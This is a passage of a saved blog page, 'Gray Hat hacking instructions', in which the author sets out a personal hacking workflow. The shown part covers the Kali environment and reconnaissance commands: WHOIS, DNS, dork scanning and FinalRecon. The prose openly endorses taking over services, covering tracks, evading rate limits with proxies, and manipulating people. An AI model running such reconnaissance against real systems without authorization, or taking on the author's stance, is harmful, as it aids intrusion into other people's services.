@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="abuseipdb-verification" content="5VXmnVN5">
+    <meta name="description" content="This is going to get messed up. And, in fact, the goal was order. I recently did some tidying up of my commands and steps for checking a service/pen testing/bounty hunting/hacking/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Gray Hat hacking instructions">
+<meta property="og:url" content="http://0ut3r.space/2024/07/12/hacking-instructions/index.html">
+<meta property="og:site_name" content="0ut3r Space">
+<meta property="og:description" content="This is going to get messed up. And, in fact, the goal was order. I recently did some tidying up of my commands and steps for checking a service/pen testing/bounty hunting/hacking/">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://0ut3r.space/2024/07/12/hacking-instructions/gray_hat_hacking_instructions.jpg">
+<meta property="og:image" content="http://0ut3r.space/2024/07/12/hacking-instructions/hacker_room.jpg">
+<meta property="article:published_time" content="2024-07-12T12:45:00.000Z">
+<meta property="article:modified_time" content="2024-12-27T11:43:32.492Z">
+<meta property="article:author" content="hoek">
+<meta property="article:tag" content="hacking">
+<meta property="article:tag" content="hacking steps">
+<meta property="article:tag" content="hacking tools">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://0ut3r.space/2024/07/12/hacking-instructions/gray_hat_hacking_instructions.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Gray Hat hacking instructions</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+    <script async="" defer="defer" data-website-id="71e1ccce-6748-4a1f-b024-ebbd1f132478" src="Gray%20Hat%20hacking%20instructions_arquivos/script.js">
+    </script>
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="Gray%20Hat%20hacking%20instructions_arquivos/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/enable" title="0ut3r Space" type="application/atom+xml">
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/">Home</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/archives/">Post</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/projects/">Projects</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/categories/">Cats</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/badges/">Ⓑ</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/donations/">$</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/tos/">§</a></li><!--
+     --><!--
+       --><li><a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/atom.xml">Rss</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/2024/08/16/syspwn-app-launcher/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/2024/06/03/swap-cab/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://0ut3r.space/2024/07/12/hacking-instructions/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;text=Gray%20Hat%20hacking%20instructions"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;title=Gray%20Hat%20hacking%20instructions"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;is_video=false&amp;description=Gray%20Hat%20hacking%20instructions"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Gray Hat hacking instructions&amp;body=Check out this article: http://0ut3r.space/2024/07/12/hacking-instructions/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;title=Gray%20Hat%20hacking%20instructions"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;title=Gray%20Hat%20hacking%20instructions"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;title=Gray%20Hat%20hacking%20instructions"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;title=Gray%20Hat%20hacking%20instructions"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;name=Gray%20Hat%20hacking%20instructions&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://0ut3r.space/2024/07/12/hacking-instructions/&amp;t=Gray%20Hat%20hacking%20instructions"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment"><span class="toc-number">1.</span> <span class="toc-text">Environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Footprinting"><span class="toc-number">2.</span> <span class="toc-text">Footprinting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WHOIS"><span class="toc-number">2.1.</span> <span class="toc-text">WHOIS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS"><span class="toc-number">2.2.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Traceroute"><span class="toc-number">2.3.</span> <span class="toc-text">Traceroute</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Google-Dorks"><span class="toc-number">2.4.</span> <span class="toc-text">Google Dorks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Internet-of-everything"><span class="toc-number">2.5.</span> <span class="toc-text">Internet of everything</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-AIO"><span class="toc-number">2.6.</span> <span class="toc-text">Recon AIO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF-check"><span class="toc-number">2.7.</span> <span class="toc-text">WAF check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Namp"><span class="toc-number">2.8.</span> <span class="toc-text">Namp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OSINT"><span class="toc-number">2.9.</span> <span class="toc-text">OSINT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scanning-and-enumeration"><span class="toc-number">3.</span> <span class="toc-text">Scanning and enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ZAP"><span class="toc-number">3.1.</span> <span class="toc-text">ZAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP"><span class="toc-number">3.2.</span> <span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#General-vulnerability-scanners"><span class="toc-number">3.3.</span> <span class="toc-text">General vulnerability scanners</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Skipfish"><span class="toc-number">3.4.</span> <span class="toc-text">Skipfish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Other-scanners-and-tests"><span class="toc-number">3.5.</span> <span class="toc-text">Other scanners and tests</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMS-Scanners"><span class="toc-number">3.6.</span> <span class="toc-text">CMS Scanners</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Subdomains"><span class="toc-number">3.7.</span> <span class="toc-text">Subdomains</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fuzzing-and-bruteforcing"><span class="toc-number">3.8.</span> <span class="toc-text">Fuzzing and bruteforcing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLi"><span class="toc-number">3.9.</span> <span class="toc-text">SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">3.10.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMTP"><span class="toc-number">3.11.</span> <span class="toc-text">SMTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WiFi-cracking"><span class="toc-number">3.12.</span> <span class="toc-text">WiFi cracking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compromised-machine"><span class="toc-number">3.13.</span> <span class="toc-text">Compromised machine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-number">3.14.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mobile"><span class="toc-number">3.15.</span> <span class="toc-text">Mobile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GitHub"><span class="toc-number">3.16.</span> <span class="toc-text">GitHub</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API"><span class="toc-number">3.17.</span> <span class="toc-text">API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI"><span class="toc-number">3.18.</span> <span class="toc-text">LFI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PCAP"><span class="toc-number">3.19.</span> <span class="toc-text">PCAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Other"><span class="toc-number">3.20.</span> <span class="toc-text">Other</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Additional-materials"><span class="toc-number">4.</span> <span class="toc-text">Additional materials</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Gray Hat hacking instructions
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">hoek</span>
+      </span>
+      
+    <div class="postdate">
+      
+	<i class="fa-solid fa-calendar-alt"></i>
+        <time datetime="2024-07-12T12:45:00.000Z" class="dt-published" itemprop="datePublished">2024-07-12</time>
+        
+        <i class="fa-solid fa-sync"></i> 
+	<time datetime="2024-12-27T11:43:32.492Z" class="dt-updated" itemprop="dateModified">2024-12-27</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/categories/guides/">guides</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/tags/hacking/" rel="tag">hacking</a>, <a class="p-category" href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/tags/hacking-steps/" rel="tag">hacking steps</a>, <a class="p-category" href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/tags/hacking-tools/" rel="tag">hacking tools</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>This is going to get messed up. And, in fact, the goal was order.</p>
+<p>I recently did some tidying up of my commands and steps for checking a
+ service/pen testing/bounty hunting/hacking/red taming/messing around. I
+ decided to write it down in one place and expand it as needed. Here is 
+my list of steps and tools I use when hacking. Mainly what I have used 
+recently. Sometimes I update the toolkit because some become obsolete 
+and are not developed anymore and new tools appear in their place. 
+Another reason is that I like to have a list of steps to follow. Hacking
+ is a complex process and sometimes it gets chaotic, so it’s worth 
+sticking to some sort of guide so I don’t accidentally forget anything. 
+There is no single golden rule or instruction on how to hack everything.
+  The general approach may have some outline, but everything changes 
+depending on what you find. It is also worth keeping an eye out for new 
+applications and scripts, because sometimes you can add something to 
+your own toolkit to speed up or automate a step, well, unless fame and 
+glory are involved.</p>
+<p>Here are some websites where you can find some new tools:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://kalilinuxtutorials.com/">KaliLinuxTutorials</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.kitploit.com/">KitPloit</a></li>
+</ul>
+<p>Well, you see, I’m not a CVE-publishing, zero-day-finding, 
+new-vulnerability-discovering hacker, i.e. I might be able to do it, but
+ it would probably take me a very long time and the reward would be 
+inadequate to the discovery. And because I am lazy, greedy, and believe 
+that fame is a restriction of freedom, I hack like a racist script 
+kiddie.</p>
+<p>My hacking is about finding low-hanging fruit and exploiting the mistakes of the man on the other side.</p>
+<p>Well, in a way that’s what hacking is all about, I have the knowledge
+ of what it should look like and the person who has the service also 
+knows it or doesn’t know it. So they have knowledge or they don’t have 
+knowledge or they have gaps in their knowledge. And these security holes
+ or lack of proper configuration makes the weakness of the service 
+available. So it’s a kind of knowledge race. Either someone will use the
+ knowledge to have a secure service or I will use it to take over.</p>
+<p>A bit of a messy description, but it works, at least for me. The more
+ I train, the more vulnerabilities I discover, the more vulnerabilities I
+ discover, the more services I take over.</p>
+<p>And it’s not like in the movies, where you order a hack and it gets 
+everywhere. A well secured place is not hackable. End of story (or I’m 
+not there yet). The only thing you can do with a well-secured place is 
+to break its owner, a human being. Then we have access to the place in 
+the same way as he does. </p>
+<p>I don’t hack people though, I leave the social engineering tricks to 
+myself to make my life easier, to get people to do what I want or to 
+agree with me when they normally wouldn’t. I enjoy manipulating people 
+more.</p>
+<p>So I hack what can be hacked, not what should be hacked or what I want to be hacked.</p>
+<p>A short break for a fancy AI-generated image - a must have in today’s
+ world on every hacker blog - for this article. The internet is now 
+flooded with this kind of AI generated graphics, so I follow the trends 
+and put this shit here too. Have fun.</p>
+<p><img src="Gray%20Hat%20hacking%20instructions_arquivos/gray_hat_hacking_instructions.jpg" alt="gray hat hacking instruction"></p>
+<p>It is funny how AI thinks hackerspace looks and how real hackerspace actually looks.</p>
+<p><img src="Gray%20Hat%20hacking%20instructions_arquivos/hacker_room.jpg" alt="real hacker room"></p>
+<p>Back to hacking. In general it’s a hard and long process, running the
+ tools, analyzing the results, understanding the results, drawing 
+conclusions, restarting the tools, re-analyzing and many hours in 
+between while the tools are running to spit out more results for 
+analysis. Analyzing and reviewing tons of data and then checking whether
+ potentially detected vulnerabilities are real and exploitable, only to 
+find out in the end that they are not.</p>
+<p>And then maybe those few clicks to take over the database or service.
+ Or finding the point at which all known options have been sorted, all 
+leads closed and the attack in question abandoned. Moving on to a list 
+of targets and selecting the next one to repeat hours or days of 
+analysis. To perhaps find nothing again. Sometimes something works a 
+couple of times a month, sometimes a couple of times a week, sometimes a
+ marathon failure occurs and nothing is found for months.</p>
+<p>It’s not as exciting as in the movies.</p>
+<p>So on paper the steps look more or less like this and sometimes they 
+are nowhere near the practice. But you have to start somewhere.</p>
+<ol>
+<li>Reconnaissance/Footprinting</li>
+<li>Scanning</li>
+<li>Gaining access</li>
+<li>Maintaining Access</li>
+<li>Clearing tracks</li>
+</ol>
+<p>There are dozens of pages describing these steps and the theories 
+behind them. You’re sure to find some. Below are my tools that are more 
+or less assigned to these steps, I focus more on reconnaissance and 
+scanning and based on the findings get access and maintain it or just 
+get what I want and sometimes clean up to make it harder to identify me,
+ but in most cases even if you leave a mess and you had a good OPSec no 
+one will find you. As I mainly check web applications and my targets are
+ mainly databases or other vulnerabilities that can be reported in the 
+bug bounty, not everything is always covered. Oh, and don’t forget that 
+I’m a senior script kiddie.</p>
+<p>Check back from time to time to see what new tools I have added and what I have removed.</p>
+<p>The list below only has basic command examples, you should always 
+spend some time tweaking the parameters. Especially those related to 
+threads and timing, throttling, aggression level and others related to 
+being less noisy. Don’t forget to add some API’s to the tools configs to
+ get better results.</p>
+<h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p>I
+ do everything on Kali Linux on a dedicated physical and virtual 
+machine. On the physical I leave the tasks that take more time, it is my
+ main machine that runs 24h (when I am hacking, otherwise it is turned 
+off). On the virtual, I test and launch custom tools and tasks that I 
+can do quickly.</p>
+<p>Additionally, when testing and hacking, the system is connected to a VPN hosted on my VPS + sometimes I use <a target="_blank" rel="noopener" href="https://www.privateinternetaccess.com/pages/buy-a-vpn/1218buyavpn?invite=U2FsdGVkX19oYLgcJdf5ifx3BndnRuyii5a276hQdRU,joP9abqfL4tGtEVitvXC93OjAOE">PIA VPN</a> + sometimes I use Tor as a socks proxy for traffic, e.g. when hacking hidden services on the onion domain.</p>
+<p>To sum things up:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.kali.org/">Kali Linux OS</a></li>
+<li>VPN (personal + VPS and <a target="_blank" rel="noopener" href="https://www.privateinternetaccess.com/pages/buy-a-vpn/1218buyavpn?invite=U2FsdGVkX19oYLgcJdf5ifx3BndnRuyii5a276hQdRU,joP9abqfL4tGtEVitvXC93OjAOE">Private Internet Access VPN</a>)</li>
+<li>Dell OptiPlex Micro 7050 (i5-6500T, 8GB 128 SSD), I’ll add more RAM and SDD one day, for now it’s enough.</li>
+<li>Virtual machine running Kali Linux on <a target="_blank" rel="noopener" href="https://www.virtualbox.org/">VirtualBox</a>. Sometimes I use <a target="_blank" rel="noopener" href="https://virt-manager.org/">virt-manager</a> to provision temporary systems.</li>
+<li>VPS, the one with the VPN configured, I also use sometimes to run some basic tools.</li>
+</ul>
+<p>For some Python tools downloaded from GitHub, I also install them as a
+ virtual environment, as sometimes system dependencies are not met. Here
+ are steps how to create <code>venv</code>, activate it, install dependencies in it and deactivate.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv .venv</span><br><span class="line"><span class="built_in">source</span> .venv/bin/activate</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">deactivate</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Footprinting"><a href="#Footprinting" class="headerlink" title="Footprinting"></a>Footprinting</h2><p>Footprinting
+ is just gathering general information about the target, it is the first
+ step in the reconnaissance process. Passive gathering (DNS, public 
+records, WHOIS, social media) and active gathering, i.e. interacting 
+with the system (ping, network mapping, banner grabbing). All to 
+understand what the system looks like and how it works. It is advisable 
+to distinguish between reconnaissance and scanning as much as possible, 
+so that the reconnaissance itself does not burn your operation.</p>
+<ul>
+<li><strong>WHOIS Lookup</strong>: To get domain registration information.</li>
+<li><strong>Nslookup/Dig</strong>: For DNS information.</li>
+<li><strong>Traceroute</strong>: To determine the path to a destination.</li>
+<li><strong>Google Dorking</strong>: Use specific search queries to find information that is not easily accessible.</li>
+<li><strong>Internet of everything</strong>: Shodan, ZoomEye, Censys, GreyNoise.</li>
+<li><strong>Waf</strong>: A web application hidden by a web application firewall.</li>
+<li><strong>NMAP</strong>: Basic scans.</li>
+</ul>
+<p>Information’s gathered thanks to this task:</p>
+<ul>
+<li>Domain names, IP addresses, and network blocks.</li>
+<li>Network architecture information.</li>
+<li>Employee details, email addresses, and contact information.</li>
+<li>Operating systems and software versions in use.</li>
+<li>Security policies and configurations.</li>
+</ul>
+<h3 id="WHOIS"><a href="#WHOIS" class="headerlink" title="WHOIS"></a>WHOIS</h3><p>System tools:</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Online tools:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://whois.domaintools.com/">DomainTools</a></li>
+<li><a target="_blank" rel="noopener" href="https://mxtoolbox.com/SuperTool.aspx">MXToolBox</a></li>
+</ul>
+<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>System tools:</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nslookup example.com</span><br><span class="line">nslookup -<span class="built_in">type</span>=mx example.com</span><br><span class="line">dig example.com mx</span><br><span class="line">dig example.com any</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/darkoperator/dnsrecon">Dnsrecon</a>, for automated scans</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsrecon -d example.com -t std --xml dnsrecon.xml</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>-d example.com</code>: domain </p>
+<p><code>-t std</code>: standard scan</p>
+<p><code>–xml dnsrecon.xml</code>: save the output to a file</p>
+<p>Online tools:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://dnschecker.org/all-dns-records-of-domain.php">DNSChecker</a></li>
+<li><a target="_blank" rel="noopener" href="https://dnsdumpster.com/">DNSDumpster</a></li>
+</ul>
+<h3 id="Traceroute"><a href="#Traceroute" class="headerlink" title="Traceroute"></a>Traceroute</h3><figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tracert example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Google-Dorks"><a href="#Google-Dorks" class="headerlink" title="Google Dorks"></a>Google Dorks</h3><p><a target="_blank" rel="noopener" href="https://github.com/IvanGlinkin/Fast-Google-Dorks-Scan">Fast Google Dorks Scan</a> for automated dork scan. Installed in <code>/opt</code> from GitHub.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/Fast-Google-Dorks-Scan</span><br><span class="line"><span class="built_in">chmod</span> +x FGDS.sh</span><br><span class="line">FGDS.sh example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/opsdisk/pagodo">Pagodo</a> automate Google Hacking Database scraping and searching. Installed in <code>/opt</code> from GitHub as Python virtual environment.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/pagodo</span><br><span class="line">python3 -m venv .venv</span><br><span class="line"><span class="built_in">source</span> .venv/bin/activate</span><br><span class="line">python ghdb_scraper.py -s -j -i <span class="comment"># Write all dorks to all_google_dorks.txt, all_google_dorks.json</span></span><br><span class="line">python pagodo.py -d example.com -g dorks/all_google_dorks.txt -i 5 -x 15 -s results.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>-i</code> - Specify the <strong>minimum</strong> delay between dork searches, in seconds. Don’t make this too small, or your IP will get HTTP 429’d quickly.</p>
+<p><code>-x</code> - Specify the <strong>maximum</strong> delay between dork searches, in seconds. Don’t make this too big or the searches will take a long time.</p>
+<p>Performing 7300+ search requests to Google as fast as possible will 
+simply not work. One solution is to use a bank of HTTP(S)/SOCKS proxies 
+and pass them to <code>pagodo</code>.</p>
+<p>Online tools:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database</a></li>
+</ul>
+<h3 id="Internet-of-everything"><a href="#Internet-of-everything" class="headerlink" title="Internet of everything"></a>Internet of everything</h3><p>Search for IP, cert, domain, ports and anything else related to the service that has been indexed on the Internet.</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.shodan.io/">Shodan</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.zoomeye.hk/">ZoomEye</a></li>
+<li><a target="_blank" rel="noopener" href="https://viz.greynoise.io/">GreyNoise</a></li>
+<li><a target="_blank" rel="noopener" href="https://search.censys.io/">CenSys</a></li>
+</ul>
+<h3 id="Recon-AIO"><a href="#Recon-AIO" class="headerlink" title="Recon AIO"></a>Recon AIO</h3><p>There are also cool all-in-one tools, I use <a target="_blank" rel="noopener" href="https://github.com/thewhiteh4t/FinalRecon">FinalRecon</a>. To check headers, sslinfo, whois, crawl, dns, subdomains, traceroute, base director and ports.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">finalrecon --full --url https://example.com</span><br></pre></td></tr></tbody></table></figure>
+
